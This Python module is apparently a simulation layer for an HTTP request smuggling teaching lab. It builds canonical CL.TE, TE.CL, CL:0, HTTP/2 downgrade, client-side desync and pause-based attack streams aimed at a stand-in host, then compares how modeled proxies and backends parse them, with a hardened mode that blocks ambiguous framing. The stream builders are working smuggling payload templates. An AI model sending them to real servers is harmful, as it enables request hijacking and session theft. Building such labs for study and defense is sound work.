"""
Simulation layer — models proxy and backend parsing behavior without Docker.
Real computation; only the network transport is absent.
"""
from __future__ import annotations
import asyncio
import time
from dataclasses import dataclass, field
from typing import Optional, AsyncGenerator
from protocol.framing import parse_stream
from protocol.models import Interpretation, FramingMode
from analysis.differential import compare, DifferentialResult


@dataclass
class LabEvent:
    ts: float
    kind: str  # CLIENT_SENT | PROXY_PARSED | BACKEND_PARSED | DIVERGENCE | HARDENED_BLOCKED | DONE
    message: str
    data: dict = field(default_factory=dict)


@dataclass
class ProxyProfile:
    name: str           # nginx | haproxy | caddy
    framing_preference: str  # "cl" | "te" | "auto"
    rejects_ambiguous: bool = False
    strips_te_on_h2: bool = False
    recalculates_cl: bool = False


@dataclass
class BackendProfile:
    name: str           # flask | fastapi
    framing_preference: str  # "cl" | "te"
    strict_body_consumption: bool = False
    closes_on_ambiguous: bool = False


PROXY_PROFILES: dict[str, ProxyProfile] = {
    "nginx": ProxyProfile(name="nginx", framing_preference="cl"),
    "haproxy": ProxyProfile(name="haproxy", framing_preference="te"),
    "caddy": ProxyProfile(name="caddy", framing_preference="cl"),
}

PROXY_PROFILES_HARDENED: dict[str, ProxyProfile] = {
    "nginx": ProxyProfile(name="nginx", framing_preference="cl", rejects_ambiguous=True, strips_te_on_h2=True, recalculates_cl=True),
    "haproxy": ProxyProfile(name="haproxy", framing_preference="te", rejects_ambiguous=True, strips_te_on_h2=True, recalculates_cl=True),
    "caddy": ProxyProfile(name="caddy", framing_preference="cl", rejects_ambiguous=True, strips_te_on_h2=True, recalculates_cl=True),
}

BACKEND_PROFILES: dict[str, BackendProfile] = {
    "flask": BackendProfile(name="flask", framing_preference="te"),
    "fastapi": BackendProfile(name="fastapi", framing_preference="te"),
}

BACKEND_PROFILES_HARDENED: dict[str, BackendProfile] = {
    "flask": BackendProfile(name="flask", framing_preference="te", strict_body_consumption=True, closes_on_ambiguous=True),
    "fastapi": BackendProfile(name="fastapi", framing_preference="te", strict_body_consumption=True, closes_on_ambiguous=True),
}


def _has_ambiguous_framing(raw: bytes) -> bool:
    """Check if stream contains both CL and TE headers."""
    has_cl = b"content-length" in raw.lower()
    has_te = b"transfer-encoding" in raw.lower()
    return has_cl and has_te


def build_clte_stream(smuggled_prefix: bytes = b"G") -> bytes:
    """Construct a canonical CL.TE attack stream."""
    smuggled = smuggled_prefix + b" / HTTP/1.1\r\nHost: lab.rift\r\n\r\n"
    # Chunked body: one small chunk then terminator, with CL declaring more
    chunked_body = b"0\r\n\r\n" + smuggled
    cl_value = len(chunked_body)
    return (
        b"POST /demo HTTP/1.1\r\n"
        b"Host: lab.rift\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(cl_value).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        + chunked_body
    )


def build_tecl_stream(body_extra: bytes = b"SMUGGLED") -> bytes:
    """Construct a canonical TE.CL attack stream."""
    chunk_data = b"x=1"
    chunked_body = (
        hex(len(chunk_data)).encode().lstrip(b"0b") + b"\r\n"
        + chunk_data + b"\r\n"
        + b"0\r\n\r\n"
        + body_extra
    )
    cl_value = len(chunk_data)  # backend sees only this many body bytes
    return (
        b"POST /demo HTTP/1.1\r\n"
        b"Host: lab.rift\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Content-Length: " + str(cl_value).encode() + b"\r\n"
        b"\r\n"
        + chunked_body
    )


def build_cl0_stream(trailing: bytes = b"GET /admin HTTP/1.1\r\nHost: lab.rift\r\n\r\n") -> bytes:
    """Construct a CL:0 stream."""
    return (
        b"POST /demo HTTP/1.1\r\n"
        b"Host: lab.rift\r\n"
        b"Content-Length: 0\r\n"
        b"\r\n"
        + trailing
    )


def build_h2_downgrade_stream(injected_cl: int = 100) -> bytes:
    """Simulate an H2→HTTP/1.1 translation with injected Content-Length."""
    real_body = b"x=harmless_value"
    return (
        b"POST /demo HTTP/1.1\r\n"
        b"Host: lab.rift\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(injected_cl).encode() + b"\r\n"
        b"\r\n"
        + real_body
        + b"GET /h2-injected HTTP/1.1\r\nHost: lab.rift\r\n\r\n"
    )


def build_csd_stream() -> bytes:
    """Client-side desync stream with synthetic victim headers."""
    return (
        b"POST /demo HTTP/1.1\r\n"
        b"Host: lab.rift\r\n"
        b"Content-Length: 0\r\n"
        b"Connection: keep-alive\r\n"
        b"\r\n"
        b"GET /victim-endpoint HTTP/1.1\r\n"
        b"Host: lab.rift\r\n"
        b"Cookie: session=DEMO_VICTIM_SESSION_8F31\r\n"
        b"Authorization: Bearer DEMO_VICTIM_TOKEN\r\n"
        b"\r\n"
    )


def build_pause_stream(write_delay_ms: int = 100) -> bytes:
    """Pause-based stream — timing info embedded in metadata."""
    return (
        b"POST /demo HTTP/1.1\r\n"
        b"Host: lab.rift\r\n"
        b"Content-Length: 100\r\n"
        b"\r\n"
        b"partial_body_data_before_pause="
        + b"X" * 20
        + b"GET /timeout-smuggled HTTP/1.1\r\nHost: lab.rift\r\n\r\n"
    )


STREAM_BUILDERS = {
    "cl-te": build_clte_stream,
    "te-cl": build_tecl_stream,
    "cl-0": build_cl0_stream,
    "h2-cl": build_h2_downgrade_stream,
    "h2-te": build_h2_downgrade_stream,
    "client-side-desync": build_csd_stream,
    "pause-based": build_pause_stream,
}

FRONTEND_PREFS = {
    "cl-te": "cl",
    "te-cl": "te",
    "cl-0": "cl",
    "h2-cl": "cl",
    "h2-te": "cl",
    "client-side-desync": "cl",
    "pause-based": "cl",
}

BACKEND_PREFS = {
    "cl-te": "te",
    "te-cl": "cl",
    "cl-0": None,
    "h2-cl": "cl",
    "h2-te": "te",
    "client-side-desync": None,
    "pause-based": "cl",
}


async def run_scenario(
    scenario_id: str,
    proxy_name: str = "nginx",
    backend_name: str = "flask",
    hardened: bool = False,
    timing_ms: int = 0,
) -> AsyncGenerator[LabEvent, None]:
    """Run a scenario simulation, yielding events as they occur."""
    t0 = time.time()

    def ts() -> float:
        return round((time.time() - t0) * 1000, 2)

    yield LabEvent(ts=ts(), kind="INIT", message="Lab initializing", data={
        "scenario": scenario_id,
        "proxy": proxy_name,
        "backend": backend_name,
        "mode": "hardened" if hardened else "research",
    })

    await asyncio.sleep(0.05)

    # Pick profiles
    proxy = (PROXY_PROFILES_HARDENED if hardened else PROXY_PROFILES).get(proxy_name)
    backend = (BACKEND_PROFILES_HARDENED if hardened else BACKEND_PROFILES).get(backend_name)

    if not proxy or not backend:
        yield LabEvent(ts=ts(), kind="ERROR", message=f"Unknown proxy '{proxy_name}' or backend '{backend_name}'")
        return

    yield LabEvent(ts=ts(), kind="PROXY_READY", message=f"Proxy '{proxy.name}' ready", data={"config": proxy.__dict__})
    await asyncio.sleep(0.03)
    yield LabEvent(ts=ts(), kind="BACKEND_READY", message=f"Backend '{backend.name}' ready", data={"config": backend.__dict__})
    await asyncio.sleep(0.03)

    # Build the raw stream
    builder = STREAM_BUILDERS.get(scenario_id)
    if not builder:
        yield LabEvent(ts=ts(), kind="ERROR", message=f"No stream builder for scenario '{scenario_id}'")
        return

    raw_stream = builder()
    yield LabEvent(ts=ts(), kind="CLIENT_SENT", message="Synthetic client transmitted request stream", data={
        "bytes": len(raw_stream),
        "hex": raw_stream.hex(),
        "ascii": raw_stream.decode("latin-1"),
    })

    if timing_ms > 0:
        await asyncio.sleep(timing_ms / 1000)

    # Hardened check: reject ambiguous framing
    if hardened and proxy.rejects_ambiguous and _has_ambiguous_framing(raw_stream):
        yield LabEvent(ts=ts(), kind="HARDENED_BLOCKED", message="Proxy rejected request — ambiguous framing detected", data={
            "rule": "reject_ambiguous_framing",
            "reason": "Both Content-Length and Transfer-Encoding present",
        })
        yield LabEvent(ts=ts(), kind="DONE", message="Scenario complete — request blocked before backend", data={
            "divergence": False,
            "hardened_blocked": True,
        })
        return

    # Frontend interpretation
    frontend_pref = FRONTEND_PREFS.get(scenario_id)
    frontend = parse_stream(raw_stream, tier="frontend", framing_preference=frontend_pref)
    yield LabEvent(ts=ts(), kind="PROXY_PARSED", message=f"Proxy interpreted {len(frontend.messages)} request(s)", data={
        "message_count": len(frontend.messages),
        "framing": frontend.framing_decision.value,
        "consumed_bytes": frontend.consumed_bytes,
        "boundaries": [{"start": b.start_byte, "end": b.end_byte, "label": b.label, "semantic": b.semantic} for b in frontend.boundaries],
        "notes": frontend.notes,
    })

    await asyncio.sleep(0.04)

    # Backend interpretation
    backend_pref = BACKEND_PREFS.get(scenario_id)
    backend_interp = parse_stream(raw_stream, tier="backend", framing_preference=backend_pref)
    yield LabEvent(ts=ts(), kind="BACKEND_PARSED", message=f"Backend interpreted {len(backend_interp.messages)} request(s)", data={
        "message_count": len(backend_interp.messages),
        "framing": backend_interp.framing_decision.value,
        "consumed_bytes": backend_interp.consumed_bytes,
        "boundaries": [{"start": b.start_byte, "end": b.end_byte, "label": b.label, "semantic": b.semantic} for b in backend_interp.boundaries],
        "notes": backend_interp.notes,
    })

    await asyncio.sleep(0.03)

    # Differential analysis
    result = compare(frontend, backend_interp)

    if result.divergence and result.divergence.exists:
        yield LabEvent(ts=ts(), kind="DIVERGENCE", message="Boundary divergence detected", data={
            "message_count_difference": result.divergence.message_count_difference,
            "frontend_count": result.divergence.frontend_count,
            "backend_count": result.divergence.backend_count,
            "divergent_byte_offset": result.divergence.divergent_byte_offset,
            "smuggled_region_hex": result.divergence.smuggled_region.hex() if result.divergence.smuggled_region else None,
            "explanation": result.divergence.explanation,
            "severity": result.divergence.severity,
        })
    else:
        yield LabEvent(ts=ts(), kind="NO_DIVERGENCE", message="No boundary divergence — interpretations equivalent")

    yield LabEvent(ts=ts(), kind="DONE", message="Scenario complete", data={
        "divergence": result.divergence.exists if result.divergence else False,
        "hardened_blocked": False,
        "equivalent": result.equivalent,
    })
